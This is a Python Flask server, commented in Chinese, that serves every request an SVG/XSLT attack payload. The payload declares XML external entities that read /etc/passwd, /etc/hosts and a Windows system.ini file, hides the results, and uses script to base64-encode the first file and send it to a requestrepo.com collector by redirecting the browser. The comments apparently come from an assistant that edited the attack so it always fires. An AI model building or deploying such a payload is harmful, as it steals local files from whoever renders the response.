from flask import Flask, request

app = Flask(__name__)

# 计数器可以保留，但注意多线程环境下可能需要加锁，简单场景下暂时忽略
n = 0  # 用于计数请求次数

@app.before_request
def handle_request():
    global n
    print(f"当前请求次数: {n}")
    n += 1  # 每次请求后计数+1

    # 打印请求体（调试用）
    body = request.data
    body_str = body.decode('utf-8', errors='ignore')  # 避免解码错误
    print(f"请求体: {body_str}")
    user_agent = request.headers.get('User-Agent', '')
    print(f"User-Agent: {user_agent}")

    # --- 关键修改部分 ---
    # 移除条件判断，总是返回 SVG 内容用于预览
    # 注意：内嵌的 XSLT 和外部实体引用的行为取决于浏览器的安全设置和是否支持 XSLT 渲染
    svg_content = '''<?xml version="1.0" encoding="UTF-8"?>  
<?xml-stylesheet type="text/xsl" href="?#"?>  
<!DOCTYPE div [  
  <!ENTITY passwd        "file:///etc/passwd">  
  <!ENTITY passwd_a SYSTEM "file:///etc/passwd">  
  <!ENTITY  host        "file:///etc/hosts">  
  <!ENTITY  host_a SYSTEM "file:///etc/hosts">  
  <!ENTITY  winsys        "file:///c:/windows/system.ini">  
  <!ENTITY  winsys_a SYSTEM "file:///c:/windows/system.ini">  
<!-- 可自行添加想读取文件目录，之后需要在t标签中添加元素 -->  
]>  
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">  
  <xsl:template match="/">  
    <xsl:copy-of select="document('')"/>  
    <body xmlns="http://www.w3.org/1999/xhtml">  
      <div style="display:none">  
        <t class="&passwd;">&passwd_a;</t>  
        <t class="&host;">&host_a;</t>  
        <t class="&winsys;">&winsys_a;</t>  
      </div>      <div style="width:40rem" id="r" />  
      <script>  
        setTimeout(`location.href=("https://slbxnkvb.requestrepo.com/?"+btoa(document.querySelectorAll('t')[0].innerHTML))`);
        </script>  
    </body>  
    </xsl:template>
    </xsl:stylesheet>
'''
    # 返回 SVG 内容，并设置正确的 Content-Type
    # charset=utf-8 通常对于 XML 是好的实践
    return svg_content, 200, {'Content-Type': 'image/svg+xml; charset=utf-8'}

    # --- 原始重定向逻辑已注释 ---
    # else:
    #     return redirect(f"https://...your_redirect_url...", 302)


# --- 重要提示 ---
# 你原始代码中的 XSLT 方式 <?xml-stylesheet type="text/xsl" href="?#"?> 
# 以及 document('') 函数调用，在现代浏览器中行为非常不可靠，
# 因为安全限制和对 XSLT 处理的支持减弱。
# 上面提供的 SVG 是更标准的、用于预览的方式。
# 如果你必须测试 XSLT 注入效果，请明确说明，并理解其局限性。

if __name__ == '__main__':
    # debug=True 在生产环境不推荐，开发测试时可用
    app.run(host='0.0.0.0', port=8081, debug=True) 
